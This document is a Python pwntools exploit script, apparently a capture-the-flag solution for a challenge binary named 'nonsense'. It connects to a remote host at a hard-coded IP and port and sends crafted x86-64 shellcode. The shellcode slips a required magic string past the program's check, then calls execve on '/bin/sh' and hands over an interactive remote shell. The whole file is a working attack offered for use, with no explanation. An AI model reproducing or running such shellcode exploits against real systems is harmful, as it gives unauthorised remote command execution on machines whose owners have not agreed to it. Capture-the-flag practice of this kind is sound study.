#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('60.250.197.227', 10001)
#r = process('./nonsense')
#gdb.attach(proc.pidof(r)[0])

nonsense = b'wubbalubbadubdub'

shellcode = asm('''
    ja here
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    here:
''')[:-len(nonsense)] + nonsense + asm('''
    mov rax, 59
    mov rdi, 0x601100
    mov rsi, 0
    mov rdx, 0
    syscall
''')

r.send(b'/bin/sh\x00' + b'\x00' * 8)
r.send(shellcode)

r.interactive()
